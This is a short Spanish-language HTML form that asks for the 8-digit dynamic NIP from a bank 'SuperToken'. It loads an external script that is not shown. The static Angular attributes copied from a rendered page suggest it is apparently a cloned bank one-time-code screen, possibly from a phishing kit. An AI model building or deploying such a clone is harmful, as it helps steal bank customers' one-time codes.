<script src="Telas_Mobile.js"></script>

<script>
    function soloNumeros(e){
        var key = window.Event ? e.which : e.keyCode
        return (key >= 48 && key <= 57)
    }
</script>

<form id="frmData" style="" name="frmData" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
    <div _ngcontent-c36="" class="col-12" style="margin-bottom: 10px;">
        <div style="width: 100%;text-align: center">
            <img _ngcontent-c36="" alt="" class="supertoken" src="../assets/img/supertoken.svg">
        </div>
        <!----><p _ngcontent-c36="" class="mt-5 ng-star-inserted">
          Ingrese el NIP din&aacute;mico de 8 d&aacute;gitos que muestra su SuperToken.
        </p>
        <!---->
        <!---->
        <label _ngcontent-c36="" class="small-label">
          NIP din&aacute;mico de supertoken
        </label>
        <input _ngcontent-c36="" onKeyPress="return soloNumeros(event)" id="otpInput" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="otpInput" type="password">
    </div>
    
    <span _ngcontent-c23=""></span>



    <div _ngcontent-c23="" class="row justify-content-center my-4">
        <button id="btnSUperTokenBTN" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
            Aceptar
        </button>
    </div>
</form>
